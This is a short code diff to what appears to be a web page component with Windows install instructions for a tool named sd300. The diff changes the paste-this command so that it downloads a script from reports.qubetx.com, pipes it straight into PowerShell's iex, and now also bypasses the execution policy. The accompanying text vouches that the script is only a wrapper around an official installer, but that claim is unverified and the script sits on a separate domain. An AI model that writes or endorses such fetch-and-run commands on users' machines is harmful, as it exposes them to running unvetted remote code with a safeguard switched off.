@@ -123,7 +123,7 @@ export default function SD300Install() {
       label: 'Windows',
       prompt: 'PS>',
       comment: '# Install the prebuilt sd300 binary',
-      command: 'irm https://reports.qubetx.com/install-sd300.ps1 | iex',
+      command: 'powershell -ExecutionPolicy ByPass -c "irm https://reports.qubetx.com/install-sd300.ps1 | iex"',
       explanation: "Fetches a small wrapper script from reports.qubetx.com that internally runs the official cargo-dist installer, which downloads the prebuilt sd300.exe binary for x86_64 Windows into %USERPROFILE%\\.cargo\\bin. No Rust toolchain, no MSVC Build Tools — the binary is already compiled.",
       updateCommand: 'sd300 update',
       note: "Runs in user scope — no administrator PowerShell needed."
